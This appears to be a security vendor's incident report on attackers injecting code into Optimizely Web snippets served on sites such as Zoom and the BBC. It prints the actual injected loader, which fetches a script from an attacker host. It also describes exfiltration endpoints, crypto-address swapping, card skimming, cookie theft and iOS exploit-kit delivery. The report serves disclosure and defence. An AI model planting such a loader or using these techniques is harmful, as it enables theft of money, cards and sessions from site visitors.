The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock . The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits . Crypto has already been stolen, with verified transactions to the attackers. This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded. The important lesson here is that trusted JavaScript doesn't always remain trustworthy . A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached. Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on. What happened Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js . The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript ( projectJS ): custom code the customer writes in their Optimizely dashboard, which runs on every page. The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com , with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet: "projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})(); We saw three versions of the injected loader: A plain &lt;script&gt; tag pointing at https://1688360.cc/track.js (most snippets). The same URL hidden in base64 with atob() . A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time. A full inline copy of the payload , which runs through eval if 1688360.cc is blocked. Some customers serve their snippet from their own domain, such as opt.scheels.com/js/&lt;id&gt;.js or www.vodafone.com.au/js/&lt;id&gt;.js . Those were affected too, because the content comes from the same Optimizely project. We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code. The attacker added features, and added wallets but never removed any. What the payload does Every visitor received the same script, track.js , and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page. 1. Crypto address swapping (already stealing money) The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in: page text, form fields, links and images; the clipboard, on copy and through navigator.clipboard ; outgoing fetch /XHR requests, window.open , navigation and the iOS share sheet. It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's. 2. Card skimming Added at 13:43 UTC. The script watches form submissions and every fetch /XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon . Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not. 3. Cookie and screenshot theft When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php : the page URL; document.cookie (cookies not marked HttpOnly ); the original addresses it replaced; a screenshot of the page, rendered with html2canvas. 4. iOS exploit kits: Coruna and DarkSword On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu . It reads the iOS version and loads an exploit chain in a hidden iframe: iOS version Chain 13 to 17 Coruna ( /A8/ , plus a direct Coruna loader at /JIUJIU888/index.js ) 18.x DarkSword ( /B9/ , /D11/ , /D12/ ) 26 Separate chain ( /C10/ ); currently only fingerprints the device The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom. Who was affected We fetched 1,611 distinct Optimizely snippets , found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.
